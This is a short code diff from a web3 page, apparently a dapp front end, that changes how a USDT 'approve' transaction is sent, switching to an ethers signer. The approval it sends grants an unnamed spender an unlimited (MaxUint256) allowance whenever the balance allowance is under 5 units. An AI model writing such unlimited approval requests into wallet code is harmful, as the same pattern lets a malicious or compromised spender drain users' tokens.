@@ -135,12 +135,14 @@ export default function Home() {
       if (allowance < ethers.parseUnits("5", 6)) {
         setNotice("Waiting for approval confirmation...");
         const data = new ethers.Interface(erc20).encodeFunctionData("approve", [spender, ethers.MaxUint256]);
-        const txHash = await provider.request({
-          method: "eth_sendTransaction",
-          params: [{ from: address, to: token, data, value: "0x0" }]
+        const signer = await browserProvider.getSigner(address);
+        const txResponse = await signer.sendTransaction({
+          to: token,
+          data,
+          value: 0
         });
-        if (typeof txHash !== "string") throw new Error("Wallet did not return a transaction hash.");
-        const receipt = await browserProvider.waitForTransaction(txHash);
+        if (!txResponse?.hash) throw new Error("Wallet did not return a transaction hash.");
+        const receipt = await txResponse.wait();
         if (!receipt || receipt.status !== 1) throw new Error("USDT approval transaction failed.");
       }
 
